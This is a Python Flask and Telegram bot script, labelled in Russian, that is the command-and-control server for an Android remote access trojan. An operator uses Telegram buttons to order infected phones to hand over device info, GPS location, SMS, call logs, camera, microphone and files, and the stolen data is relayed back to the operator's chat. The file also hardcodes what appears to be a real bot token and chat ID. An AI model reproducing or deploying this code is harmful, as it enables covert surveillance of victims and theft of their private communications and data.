import os
import threading
from flask import Flask, request, jsonify
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Dispatcher, CommandHandler, CallbackQueryHandler, CallbackContext

BOT_TOKEN = '8637699821:AAEWDlUoj5lWMARCp-0dsEzcPjvyK8xgB_Q'
CHAT_ID = '7803661441'

bot = Bot(token=BOT_TOKEN)
app = Flask(__name__)
latest_command = {"cmd": "none"}

@app.route('/')
def home():
    return "✅ RAT СЕРВЕР РАБОТАЕТ!", 200

@app.route('/health')
def health():
    return "OK", 200

@app.route('/get_command', methods=['GET'])
def get_command():
    cmd = latest_command["cmd"]
    if cmd != "none":
        latest_command["cmd"] = "none"
    return {"command": cmd}

@app.route('/send_data', methods=['POST'])
def send_data():
    data = request.get_json()
    if data and 'message' in data:
        bot.send_message(chat_id=CHAT_ID, text=f"📱 Данные с устройства:\n{data['message']}")
    return "OK", 200

def start(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("📱 ИНФО", callback_data='info'), InlineKeyboardButton("📍 GPS", callback_data='location')],
        [InlineKeyboardButton("💬 СМС", callback_data='sms'), InlineKeyboardButton("📞 ЗВОНКИ", callback_data='calls')],
        [InlineKeyboardButton("📷 КАМЕРА", callback_data='camera'), InlineKeyboardButton("🎙️ МИКРОФОН", callback_data='mic')],
        [InlineKeyboardButton("📁 ФАЙЛЫ", callback_data='files'), InlineKeyboardButton("🗑️ УДАЛИТЬ", callback_data='uninstall')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text('✅ Android RAT АКТИВИРОВАН. Выберите действие:', reply_markup=reply_markup)

def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    command = query.data
    latest_command["cmd"] = command
    query.edit_message_text(text=f"✅ Команда '{command}' отправлена на устройство.")

def run_bot():
    dispatcher = Dispatcher(bot, None, use_context=True)
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CallbackQueryHandler(button_callback))
    dispatcher.bot.delete_webhook()
    dispatcher.start_polling()
    dispatcher.idle()

if __name__ == '__main__':
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
